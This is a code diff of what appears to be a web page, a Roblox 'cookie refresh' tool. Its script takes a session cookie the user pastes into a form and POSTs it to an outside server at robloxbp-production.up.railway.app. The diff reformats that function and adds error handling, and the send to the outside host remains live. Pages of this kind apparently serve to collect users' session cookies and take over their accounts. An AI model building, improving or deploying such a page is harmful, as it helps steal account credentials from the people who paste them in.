@@ -59,21 +59,29 @@
   <p id="resposta"></p>
 
   <script>
-    async function enviarCookie() {
-      const cookie = document.getElementById("cookie").value;
-      const respostaElement = document.getElementById("resposta");
+     async function enviarCookie() {
+    const cookie = document.getElementById("cookie").value;
+    const respostaElemento = document.getElementById("resposta");
 
-      try {
-        const resposta = await fetch("https://robloxbp-production.up.railway.app/refresh", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ cookie })
-        });
+    try {
+      const resposta = await fetch("https://robloxbp-production.up.railway.app/refresh", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({ cookie })
+      });
 
-        const dados = await resposta.json();
-        respostaElement.innerText = JSON.stringify(dados, null, 2);
-      } catch (erro) {
-        respostaElement.innerText = "Erro ao processar resposta: " + erro.message;
+      // Verifica se o status da resposta é OK (200–299)
+      if (!resposta.ok) {
+        const texto = await resposta.text();
+        throw new Error(`Erro HTTP ${resposta.status}: ${texto}`);
+      }
+
+      const dados = await resposta.json();
+      respostaElemento.innerText = JSON.stringify(dados, null, 2);
+    } catch (erro) {
+      respostaElemento.innerText = "Erro ao processar resposta: " + erro.message;
       }
     }
   </script>
